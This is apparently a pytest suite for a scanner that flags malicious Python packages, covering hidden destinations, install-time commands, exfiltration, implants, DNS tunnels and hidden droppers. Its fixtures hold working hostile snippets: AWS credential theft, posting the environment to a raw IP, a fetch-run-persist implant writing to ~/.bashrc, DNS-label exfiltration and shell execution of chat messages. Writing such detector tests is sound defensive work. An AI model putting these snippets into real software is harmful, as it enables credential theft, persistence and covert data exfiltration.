"""A send of what the machine holds to a destination the code hides
(`detect/code/capability/hidden_destination.py`), and the rule id each Python fact is labelled
with (`detect/code/capability/fact_ids.py`)."""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.analysis.python import pyast
from cordon_scanner.analysis.python.pyfacts import AstHit
from cordon_scanner.detect.base import FileUnit
from cordon_scanner.detect.code.capability.fact_ids import PythonFactIds
from cordon_scanner.detect.code.capability.hidden_destination import HiddenDestination
from cordon_scanner.detect.code.capability.install_programs import InstallPrograms
from cordon_scanner.detect.code.capability.labelling import Labelling
from cordon_scanner.detect.code.capability.rule_ids import CompositeRuleIds
from cordon_scanner.engine.engine import Engine
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.results import Repository


class TestWhichSendsAreHidden:
    @pytest.mark.parametrize(
        "detail",
        [
            "identity sent: requests.post dest=decoded",
            "environment sent: urllib.request.urlopen dest=decoded",
            "secret sent: GITHUB_TOKEN to - dest=decoded",
        ],
    )
    def test_a_send_marked_decoded(self, detail: str) -> None:
        assert HiddenDestination.applies(detail)

    @pytest.mark.parametrize(
        "detail",
        [
            "identity sent: requests.post",
            "identity sent: requests.post dest=declared",
            "requests.post dest=decoded",
            "identity sent: requests.post dest=decodedx",
        ],
    )
    def test_anything_else(self, detail: str) -> None:
        assert not HiddenDestination.applies(detail)

    def test_the_rule_is_never_lowered_for_running_on_request(self) -> None:
        assert HiddenDestination.RULE not in CompositeRuleIds.ON_REQUEST_RULES


class TestTheFactIsRaisedBesideTheSend:
    def test_both_facts_for_a_hidden_send_and_one_for_a_plain_one(self, monkeypatch) -> None:
        hits = [
            AstHit(Capability.EGRESS, 2, "identity sent: requests.post dest=decoded"),
            AstHit(Capability.EGRESS, 3, "identity sent: requests.post"),
        ]
        monkeypatch.setattr(pyast.PythonAnalyzer, "analyse", classmethod(lambda cls, *a, **k: hits))
        content = FileContent.from_bytes("pkg/t.py", b"import requests\na = 1\nb = 2\n")
        ctx = Engine(Config.default())._context(Repository(root="."))
        resolved, _ = Labelling.resolved_capabilities(
            FileUnit(content=content, language="python"), content, ctx
        )
        assert sorted((h.rule_id, h.line) for h in resolved) == [
            ("AST.PY.IDENTITY_SENT", 2),
            ("AST.PY.IDENTITY_SENT", 3),
            (HiddenDestination.FACT, 2),
        ]


class TestTheRuleShips:
    def test_the_rule_is_in_the_built_in_pack_and_matches_the_fact(self) -> None:
        from cordon_scanner.rules.loader import RuleLoader

        compiled = {c.rule.id: c for pack in RuleLoader.load_builtin() for c in pack.rules}
        rule = compiled[HiddenDestination.RULE]
        assert rule.rule.category.value == "malicious"
        assert HiddenDestination.FACT in repr(rule)


class TestEachFactNamesItsRule:
    @pytest.mark.parametrize(
        ("detail", "capability", "rule"),
        [
            ("identity sent: requests.post", Capability.EGRESS, "AST.PY.IDENTITY_SENT"),
            (
                "identity sent: requests.post dest=decoded",
                Capability.EGRESS,
                "AST.PY.IDENTITY_SENT",
            ),
            ("environment sent: urlopen", Capability.EGRESS, "AST.PY.ENVIRONMENT_SENT"),
            ("secret sent: GITHUB_TOKEN to h", Capability.EGRESS, "AST.PY.SECRET_SENT"),
            ("hidden request: urlopen dest=decoded", Capability.EGRESS, "AST.PY.HIDDEN_REQUEST"),
            (
                "os.chmod makes a decoded file runnable",
                Capability.EXECUTE,
                "AST.PY.DECODED_DROP_RUN",
            ),
            ("Popen runs a decoded file", Capability.SPAWN, "AST.PY.DECODED_DROP_RUN"),
            (
                "run_path loads a decoded file as code",
                Capability.EXECUTE,
                "AST.PY.DECODED_DROP_RUN",
            ),
            ("unsafe model load: torch.load", Capability.EXECUTE, "AST.PY.UNSAFE_MODEL_LOAD"),
            (
                "remote model code: trust_remote_code",
                Capability.EXECUTE,
                "AST.PY.REMOTE_MODEL_CODE",
            ),
            ("unsafe model option: weights_only", Capability.EXECUTE, "AST.PY.UNSAFE_MODEL_OPTION"),
            ("executed literal: subprocess.run", Capability.SPAWN, "AST.PY.HIDDEN_ACTION"),
            ("executed literal: print", Capability.EXECUTE, "AST.PY.EXECUTE"),
            ("urllib.request.urlopen", Capability.EGRESS, "AST.PY.EGRESS"),
        ],
    )
    def test_each_fact_names_its_rule(self, detail: str, capability: Capability, rule: str) -> None:
        assert PythonFactIds.rule_id(detail, capability) == rule


class TestAProgramNoInstallNeeds:
    @pytest.mark.parametrize(
        "command",
        ["calc", "calc.exe", "cmd /c calc", "C:\\Windows\\System32\\notepad.exe", "id", "whoami",
         "sh -c hostname", "start /b mspaint"],
    )  # fmt: skip
    def test_a_desktop_application_or_identity_command(self, command: str) -> None:
        assert InstallPrograms.foreign(command)

    @pytest.mark.parametrize(
        "command",
        ["git rev-parse HEAD", "cmake ..", "make", "python setup.py build_ext", "echo done",
         "touch build/stamp", "cmd /c dir", None, ""],
    )  # fmt: skip
    def test_build_tooling_and_harmless_commands(self, command: str | None) -> None:
        assert not InstallPrograms.foreign(command)


class TestTheGradesBlock:
    @staticmethod
    def rules(root: Path) -> set[str]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {f.rule_id for f in result.findings}

    @staticmethod
    def sdist(tmp_path: Path, setup: str, extra: dict[str, str] | None = None) -> Path:
        """A published sdist, as pip receives it."""
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
            "setup.py": setup,
            "demo/__init__.py": "",
            **{f"demo/{name}": text for name, text in (extra or {}).items()},
        }
        archive = tmp_path / "demo-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"demo-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        return archive

    def test_a_calculator_started_by_setup_blocks(self, tmp_path: Path) -> None:
        setup = "import os\nfrom setuptools import setup\nos.system('calc')\nsetup(name='demo')\n"
        assert InstallPrograms.RULE in self.rules(self.sdist(tmp_path, setup))

    def test_an_identity_command_in_setup_blocks(self, tmp_path: Path) -> None:
        setup = "import subprocess\nfrom setuptools import setup\nsubprocess.run(['id'])\nsetup(name='demo')\n"
        assert InstallPrograms.RULE in self.rules(self.sdist(tmp_path, setup))

    def test_git_in_setup_and_calc_in_a_library_function_do_not(self, tmp_path: Path) -> None:
        setup = "import subprocess\nfrom setuptools import setup\nsubprocess.run(['git', 'describe'])\nsetup(name='demo')\n"
        lib = "import os\ndef open_calculator():\n    os.system('calc')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"tools.py": lib}))
        assert InstallPrograms.RULE not in rules

    def test_a_credential_store_sent_outside_its_home_blocks(self, tmp_path: Path) -> None:
        lib = (
            "import configparser, json, os, urllib.request\n"
            "def push():\n"
            "    c = configparser.ConfigParser()\n"
            "    c.read(os.path.expanduser('~/.aws/credentials'))\n"
            "    found = {s: dict(c[s]) for s in c.sections()}\n"
            "    urllib.request.urlopen(os.environ['HOOK'], json.dumps(found).encode())\n"
        )
        setup = "from setuptools import setup\nsetup(name='demo')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"sync.py": lib}))
        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" in rules

    def test_an_upload_tool_sending_pypirc_to_its_index_does_not(self, tmp_path: Path) -> None:
        lib = (
            "import configparser, os, requests\n"
            "def upload(dist):\n"
            "    c = configparser.ConfigParser()\n"
            "    c.read(os.path.expanduser('~/.pypirc'))\n"
            "    auth = (c['pypi']['username'], c['pypi']['password'])\n"
            "    requests.post('https://upload.pypi.org/legacy/', auth=auth, files={'content': dist})\n"
        )
        setup = "from setuptools import setup\nsetup(name='demo')\n"
        rules = self.rules(self.sdist(tmp_path, setup, {"up.py": lib}))
        assert "MALWARE.EXFIL.CREDENTIAL_STORE.002" not in rules


class TestADestinationOnlyWrittenAtImport:
    """evidently 0.7.23: a telemetry client constructed at import with a raw-IP `url=` and an
    opt-out flag read from the environment is a destination named, not a send. Posting the
    environment to the same address at import is a send."""

    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
            "src/telem/__init__.py": "__version__ = '1.0'\nfrom . import telemetry\n",
            "src/telem/telemetry.py": module,
        }
        archive = tmp_path / "telem-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id for f in result.findings}

    def test_a_telemetry_client_built_at_import_is_not_exfiltration(self, tmp_path: Path) -> None:
        module = (
            "import os\nimport telem\nfrom telemlib import TelemetryLogger\n"
            "DO_NOT_TRACK_ENV = 'DO_NOT_TRACK'\n"
            "event_logger = TelemetryLogger('telem', telem.__version__,\n"
            "    url='http://35.0.0.5:8000/api/v1/event', token='s',\n"
            "    enabled=lambda: not os.environ.get(DO_NOT_TRACK_ENV, None))\n"
            "def main():\n    event_logger.send_event('start')\n"
        )
        rules = self.rules(tmp_path, module)
        assert "MALWARE.EXFIL.001" not in rules
        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in rules

    def test_the_environment_posted_at_import_still_blocks(self, tmp_path: Path) -> None:
        module = (
            "import json, os, urllib.request\n"
            "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict(os.environ)).encode())\n"
        )
        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)


class TestAnImplantInstaller:
    """trickery 1.0.0: one module fetches a payload, runs it and writes a persistence location,
    reached only from a function. A downloader that only runs, or a tool that only writes a profile,
    is not this."""

    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_fetch_run_and_persist_in_one_module_blocks(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, urllib.request\n"
            "def attach(url):\n"
            "    path = os.path.expanduser('~/.cache/agent')\n"
            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
            "    subprocess.Popen([path])\n"
            "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
            "        rc.write(path + ' &\\n')\n"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" in self.rules(tmp_path, module)

    def test_a_downloader_that_does_not_persist_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, urllib.request\n"
            "def install_tool(url):\n"
            "    path = os.path.expanduser('~/.cache/tool')\n"
            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
            "    subprocess.run([path, '--version'])\n"
        )
        assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)


class TestADnsTunnel:
    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_encoded_data_resolved_in_labels_blocks(self, tmp_path: Path) -> None:
        module = (
            "import base64, os, socket\n"
            "def leak(data):\n"
            "    blob = base64.b32encode(data.encode()).decode().rstrip('=')\n"
            "    for i in range(0, len(blob), 60):\n"
            "        socket.getaddrinfo(blob[i:i + 60] + '.t.example.invalid', 53)\n"
        )
        assert "MALWARE.EXFIL.DNS_TUNNEL.001" in self.rules(tmp_path, module)

    def test_resolving_a_configured_host_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, socket\n"
            "def reachable():\n"
            "    return socket.getaddrinfo(os.environ.get('API_HOST', 'api.example.invalid'), 443)\n"
        )
        assert "MALWARE.EXFIL.DNS_TUNNEL.001" not in self.rules(tmp_path, module)


class TestACommandReceivedOnAChannel:
    """A chat bot that runs the text it is sent: the receive is not a request primitive, so the
    channel side must come from the received-run fact itself (as `CAP.JS.RECEIVED_RUN` does)."""

    @staticmethod
    def severities(tmp_path: Path, module: str) -> dict[str, str]:
        members = {
            "PKG-INFO": "Metadata-Version: 2.1\nName: telem\nVersion: 1.0\n",
            "pyproject.toml": "[project]\nname = 'telem'\nversion = '1.0'\n",
            "src/telem/__init__.py": "",
            "src/telem/bot.py": module,
        }
        archive = tmp_path / "telem-1.0.tar.gz"
        with tarfile.open(archive, "w:gz") as tgz:
            for name, text in members.items():
                data = text.encode("utf-8")
                info = tarfile.TarInfo(f"telem-1.0/{name}")
                info.size = len(data)
                tgz.addfile(info, io.BytesIO(data))
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        return {f.rule_id: f.severity.name for f in result.findings}

    def test_a_chat_message_run_as_a_command_blocks(self, tmp_path: Path) -> None:
        module = (
            "import subprocess\n"
            "from telegram.ext import Application, MessageHandler, filters\n"
            "async def on_message(update, context):\n"
            "    subprocess.run(update.message.text, shell=True)\n"
            "app = Application.builder().token('t').build()\n"
            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
        )
        found = self.severities(tmp_path, module)
        assert found.get("SUSPECT.DROPPER.001") in ("HIGH", "CRITICAL"), found

    def test_a_chat_bot_that_only_replies_does_not(self, tmp_path: Path) -> None:
        module = (
            "from telegram.ext import Application, MessageHandler, filters\n"
            "async def on_message(update, context):\n"
            "    await update.message.reply_text('got it')\n"
            "app = Application.builder().token('t').build()\n"
            "app.add_handler(MessageHandler(filters.TEXT, on_message))\n"
        )
        assert "SUSPECT.DROPPER.001" not in self.severities(tmp_path, module)


class TestADownloadStartedHidden:
    @staticmethod
    def rules(tmp_path: Path, module: str) -> set[str]:
        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)

    def test_a_downloaded_program_started_hidden_blocks(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, tempfile, urllib.request\n"
            "def fetch(url):\n"
            "    path = os.path.join(tempfile.gettempdir(), 'u.exe')\n"
            "    urllib.request.urlretrieve(url, path)\n"
            "    subprocess.Popen([path], creationflags=0x08000000)\n"
        )
        assert "MALWARE.DROPPER.HIDDEN.001" in self.rules(tmp_path, module)

    def test_a_downloaded_program_started_visibly_does_not(self, tmp_path: Path) -> None:
        module = (
            "import os, subprocess, tempfile, urllib.request\n"
            "def fetch(url):\n"
            "    path = os.path.join(tempfile.gettempdir(), 'u.exe')\n"
            "    urllib.request.urlretrieve(url, path)\n"
            "    subprocess.Popen([path])\n"
        )
        assert "MALWARE.DROPPER.HIDDEN.001" not in self.rules(tmp_path, module)
